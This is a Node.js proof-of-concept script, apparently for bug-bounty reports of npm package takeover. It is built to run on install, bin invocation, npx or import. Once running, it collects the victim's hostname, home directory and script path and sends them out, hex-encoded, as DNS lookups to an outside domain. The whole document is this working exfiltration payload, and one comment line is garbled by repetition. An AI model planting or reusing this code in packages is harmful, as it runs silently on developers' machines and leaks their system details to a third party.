#!/usr/bin/env node
// DNS canary for npm takeover findings (educational use only).
// Surfaces (npm 12 blocks dependency preinstall by default):
//   install scripts -> legacy (npm <12) or allowlisted clients
//   bin invocation  -> fires when the victim's tooling/scripts run the
//                      delivered bin (npm 12 still links bins)
//   npx fetch-run   -> npx <name> executes this file directly
//   import-time     -> require('<name>') runs this module body
// Proves WHERE and WHEN execution happened by encoding hostname/homedir/dirname
// by encoding hostname/homedir/dirname into DNS lookups under
// DNS_NAMESPACE. Nothing leaves except those lookups.
const DNS_NAMESPACE = process.env.POC_DNS_NAMESPACE || 'dns.supplyshark.io';

(async () => {
  try {
    const dns = await import('dns');
    const os = await import('os');
    const path = await import('path');

    let d = `${os.hostname()}__${os.homedir()}__${path.dirname(process.argv[1] || '.')}`;
    d = d.replace(/[^a-zA-Z0-9._]/g, (m) => `_${m.charCodeAt(0).toString(16)}`);
    d = Buffer.from(d).toString('hex').match(/.{1,50}/g) || [];
    const i = Math.random().toString(36).substring(7);

    for (const c of d) {
      await dns.promises.resolve(`${i}.${c}.${DNS_NAMESPACE}`, 'A');
    }
  } catch (err) {
    console.error(err.message || err);
  }
})();
